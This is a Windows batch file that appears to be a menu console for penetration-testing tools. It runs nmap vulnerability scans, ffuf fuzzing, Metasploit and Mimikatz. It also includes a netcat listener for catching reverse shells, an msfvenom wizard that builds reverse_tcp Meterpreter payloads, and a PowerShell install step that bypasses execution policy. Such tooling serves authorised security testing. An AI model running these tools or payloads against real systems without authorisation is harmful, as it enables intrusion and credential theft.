@echo off
setlocal enabledelayedexpansion

:: Programmatically build isolated PATH
set "BASE_DIR=%~dp0"
set "TOOL_PATH=%BASE_DIR%runtimes\python;%BASE_DIR%tools\ffuf;%BASE_DIR%tools\netcat;%BASE_DIR%tools\nmap;%BASE_DIR%tools\sysinternals;%BASE_DIR%tools\mimikatz\x64;%BASE_DIR%tools\metasploit-framework\bin;%BASE_DIR%tools\wireshark"
set "PATH=%TOOL_PATH%;%PATH%"

:MENU
cls
echo ===============================================================================
echo            HEAVY TOOLBOX - SECURITY ORCHESTRATOR CONSOLE
echo ===============================================================================
echo  1. Python Shell (Isolated)
echo  2. Mapped Sub-shell (Environment-Aware)
echo  3. Nmap Vulnerability Scan
echo  4. Ffuf Web Fuzzer
echo  5. Netcat Shell Catcher
echo  6. Tshark Packet Capture
echo  7. Metasploit Framework
echo  8. MSFvenom Wizard
echo  9. Mimikatz Audit Shortcut
echo  10. Run All Installers
echo  11. Exit
echo ===============================================================================
set /p choice="Select an option (1-11): "

if "%choice%"=="1" goto PY_SHELL
if "%choice%"=="2" goto SUB_SHELL
if "%choice%"=="3" goto NMAP_SCAN
if "%choice%"=="4" goto FFUF_FUZZ
if "%choice%"=="5" goto NC_CATCHER
if "%choice%"=="6" goto TSHARK_CAP
if "%choice%"=="7" goto MSF_FRAME
if "%choice%"=="8" goto MSFVENOM_WIZ
if "%choice%"=="9" goto MIMI_AUDIT
if "%choice%"=="10" goto RUN_INSTALL
if "%choice%"=="11" exit
goto MENU

:PY_SHELL
where python.exe >nul 2>&1
if %ERRORLEVEL% neq 0 (echo [!] Python not found. Run option 10 first. & pause & goto MENU)
python.exe
pause
goto MENU

:SUB_SHELL
echo Spawning environment-aware sub-shell...
cmd /k "set PATH=%TOOL_PATH%;%PATH%"
goto MENU

:NMAP_SCAN
where nmap >nul 2>&1
if %ERRORLEVEL% neq 0 (echo [!] Nmap not found. Please install Nmap. & pause & goto MENU)
set /p target="Enter Target IP/Hostname: "
nmap -sV --script=vuln %target%
pause
goto MENU

:FFUF_FUZZ
where ffuf >nul 2>&1
if %ERRORLEVEL% neq 0 (echo [!] ffuf not found. Run option 10 first. & pause & goto MENU)
set /p url="Enter Target URL: "
set /p wordlist="Enter Wordlist Path: "
ffuf -u %url% -w %wordlist%
pause
goto MENU

:NC_CATCHER
where nc >nul 2>&1
if %ERRORLEVEL% neq 0 (echo [!] Netcat not found. Run option 10 first. & pause & goto MENU)
set /p port="Enter Port to Listen On: "
nc -lvnp %port%
pause
goto MENU

:TSHARK_CAP
where tshark >nul 2>&1
if %ERRORLEVEL% neq 0 (echo [!] Tshark not found. Please install Wireshark/Tshark. & pause & goto MENU)
tshark -D
set /p iface="Enter Interface Index: "
set /p duration="Enter Capture Duration (seconds): "
tshark -i %iface% -a duration:%duration%
pause
goto MENU

:MSF_FRAME
if not exist "%BASE_DIR%tools\metasploit-framework\msfconsole.bat" (echo [!] msfconsole.bat not found. Please install Metasploit. & pause & goto MENU)
call "%BASE_DIR%tools\metasploit-framework\msfconsole.bat"
goto MENU

:MSFVENOM_WIZ
if not exist "%BASE_DIR%tools\metasploit-framework\msfvenom.bat" (echo [!] msfvenom.bat not found. Please install Metasploit. & pause & goto MENU)
set /p lhost="LHOST: "
set /p lport="LPORT: "
set /p payload="Payload (e.g., windows/x64/meterpreter/reverse_tcp): "
set /p format="Format (e.g., exe, raw): "
set /p outfile="Output Filename: "
call "%BASE_DIR%tools\metasploit-framework\msfvenom.bat" -p %payload% LHOST=%lhost% LPORT=%lport% -f %format% -o %outfile%
pause
goto MENU

:MIMI_AUDIT
where mimikatz.exe >nul 2>&1
if %ERRORLEVEL% neq 0 (echo [!] Mimikatz not found. Please place mimikatz.exe in tools\mimikatz\x64. & pause & goto MENU)
echo Checking for Administrative privileges...
net session >nul 2>&1
if %ERRORLEVEL% neq 0 (echo [!] WARNING: You are NOT running as Administrator. Mimikatz will have limited functionality. & pause)
mimikatz.exe
pause
goto MENU

:RUN_INSTALL
echo Executing deployment engine...
powershell -ExecutionPolicy Bypass -File "%BASE_DIR%install.ps1"
pause
goto MENU
